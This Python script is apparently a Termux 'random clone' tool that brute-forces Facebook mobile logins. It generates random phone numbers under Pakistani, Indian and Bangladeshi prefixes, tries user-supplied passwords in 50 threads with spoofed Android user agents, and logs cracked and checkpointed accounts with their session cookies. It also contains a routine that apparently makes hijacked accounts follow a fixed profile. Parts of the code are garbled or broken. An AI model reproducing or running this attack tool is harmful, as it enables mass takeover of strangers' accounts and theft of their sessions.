
import os
import sys
import time
import requests
import uuid
os.system('git pull')
os.system('pkg install curl')
class jalan:  
    def __init__(self, z):
        pass
def Emran():
    os.system('clear')
    print(logo)
    print(' {𝟭}_ \033[38;5;46m𝗦𝗧𝗔𝗥𝗧 𝗬𝗢𝗨𝗥 𝗡𝗨𝗡𝗨 𝗛𝗔𝗖𝗞')
    print(' {𝟮}_ \033[38;5;46m𝗘𝗫𝗜𝗧 𝗠𝗔𝗗𝗘𝗥𝗦𝗨𝗗')
    opt = input('\n   \033[38;5;46m𝗖𝗛𝗢𝗢𝗦𝗘 𝗢𝗣𝗧𝗜𝗢𝗡 ___😊 ')
    if opt == '1':
        i()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text                      
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # EHC EMRAN
M = '\x1b[1;91m' # EHC EMRAN
H = '\x1b[1;92m' # EHC EMRAN
K = '\x1b[1;93m' # EHC EMRAN
B = '\x1b[1;94m' # EHC EMRAN
U = '\x1b[1;95m' # EHC EMRAN
O = '\x1b[1;96m' # EHC EMRAN
N = '\x1b[0m'    # EHC EMRAN
A = '\x1b[1;90m' # EHC EMRAN
BN = '\x1b[1;107m' # EHC EMRAN
BBL = '\x1b[1;106m' # EHC EMRAN
BP = '\x1b[1;105m' # EHC EMRAN
BB = '\x1b[1;104m' # EHC EMRAN
BK = '\x1b[1;103m' # EHC EMRAN
BH = '\x1b[1;102m' # EHC EMRAN
BM = '\x1b[1;101m' # EHC EMRAN
BA = '\x1b[1;100m' # EHC EMRAN
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo = ("""
\033[1;35m@@@@@@@@  \033[38;5;46m@@@  @@@   \033[37;1m@@@@@@@  
\033[1;35m@@@@@@@@  \033[38;5;46m@@@  @@@  \033[37;1m@@@@@@@@  
\033[1;35m@@!       \033[38;5;46m@@!  @@@  \033[37;1m!@@       
\033[1;35m!@!       \033[38;5;46m!@!  @!@  \033[37;1m!@!       
\033[1;35m@!!!:!    \033[38;5;46m@!@!@!@!  \033[37;1m!@!       
\033[1;35m!!!!!:    \033[38;5;46m!!!@!!!!  \033[37;1m!!!       
\033[1;35m!!:       \033[38;5;46m!!:  !!!  \033[37;1m:!!       
\033[1;35m:!:       \033[38;5;46m:!:  !:!  \033[37;1m:!:       
\033[1;35m:: ::::   \033[38;5;46m::   :::  \033[37;1m::: :::  
\033[1;35m: :: ::    \033[38;5;46m:   : :  \033[37;1m:: :: :
\033[38;5;46m══════════════════════════════
┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ \033[38;5;46m𝗧𝗢𝗢𝗟𝗦    : \033[38;5;46m𝗥𝗔𝗡𝗗𝗢𝗠 𝗖𝗟𝗢𝗡𝗘  ┃
┃ \033[38;5;46m𝗢𝗪𝗡𝗘𝗥    : \033[38;5;46m𝗘𝗛𝗖 𝗘𝗠𝗥𝗔𝗡     ┃
┃ \033[38;5;46m𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 : \033[38;5;46m𝗘𝗠𝗥𝗔𝗡         ┃
┃ \033[38;5;46m𝗪𝗛𝗔𝗧'𝗦𝗔𝗣𝗣: \033[38;5;46m+𝟵𝟳𝟭𝟬𝟱𝟲𝟵𝟱𝟰𝟵𝟴𝟱𝟳┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    
    
    print("\033[38;5;46m\t  USE OUR COUNTRY CODE  ")
    print('\033[38;5;46m     \t     𝗣𝗔𝗞 𝗖𝗢𝗗𝗘.𝗦\n     \033[38;5;46m92301, \033[38;5;46m92302 ,\033[38;5;46m92303 ,\033[38;5;46m92305  ...\033[0;97m')
    print('\033[38;5;46m=======================================')
    print('\033[38;5;46m     \t     𝗜𝗡𝗗𝗜𝗔 𝗖𝗢𝗗𝗘.𝘀\n     \033[38;5;46m91778, \033[38;5;46m91930 ,\033[38;5;46m91902 ,\033[38;5;46m91712  ...\033[0;97m')
    print('\033[38;5;46m=======================================')
    print('\033[38;5;46m     \t     𝗕𝗗 𝗖𝗢𝗗𝗘.𝘀\n     \033[38;5;46m88016, \033[38;5;46m88017 ,\033[38;5;46m88018 ,\033[38;5;46m88019  ...\033[0;97m')
    print('\033[38;5;46m=======================================\n')
    code = input(' \033[38;5;46m𝗣𝗨𝗧 𝗖𝗢𝗗𝗘 : ')
    print("")
    limit = int(input(' \033[38;5;46m𝗘𝗫𝗔𝗠𝗣𝗟𝗘: 2000, 3000, 50000, 20000\n\n \033[38;5;46m𝗣𝗨𝗧 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗟𝗜𝗠𝗜𝗧 : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = int(input("[*] \033[38;5;46m𝗘𝗡𝗧𝗘𝗥 𝗣𝗔𝗦𝗪𝗢𝗥𝗗 𝗟𝗜𝗠𝗜𝗧 : "))
    EmraN = []
    print("")
    for bilal in range(passx):
        pww = input("[*] Enter Password : ")
        EmraN.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[38;5;46m 𝗧𝗢𝗧𝗔𝗟 𝗜𝗗 𝗥??𝗡𝗗𝗢𝗠: '+tl)      
        print('\033[38;5;46m=======================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Emran in EmraN:
                pwx.append(Emran)
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[38;5;46m=======================================')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print('\033[38;5;46m========================================')
 
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
           'method': 'GET',
           'path': '/login/device-based/login/async/',
           'scheme': 'https',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'en-US,en-IN;q=0.9,en-AI;q=0.8,en;q=0.7,hi-IN;q=0.6,hi;q=0.5',
           'dpr': '2',
           'referer': 'https://m.facebook.com/',
           'sec-ch-prefers-color-scheme': 'light',
           'sec-ch-ua': '"(Not(A:Brand";v="99"',
           'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-model': '"RMX3269"',
           'sec-ch-ua-platform': '"Android"',
           'sec-ch-ua-platform-version': '""',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'same-origin',
           'upgrade-insecure-requests': '1',
           'user-agent': 'Mozilla/5.0 (Android 11.0; Mobile; rv:113.0) Gecko/113.0 Firefox/113.0',
           'viewport-width': '980',
}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\r\r\033[38;5;46m[EMRAN-OK] \033[38;5;47m{xd} | {ps}  \n\033[38;5;46m[COOKIES] \033[38;5;49msb={sort}\n\033[38;5;48m ")
                cek_apk(session,coki)
                open('/sdcard/EMRAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('   \033[1;32m(EMRAN-CP💚)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/EMRAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r %s[EMRAN] [%s/%s]  CP:- %s  OK:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
 
Emran()
 
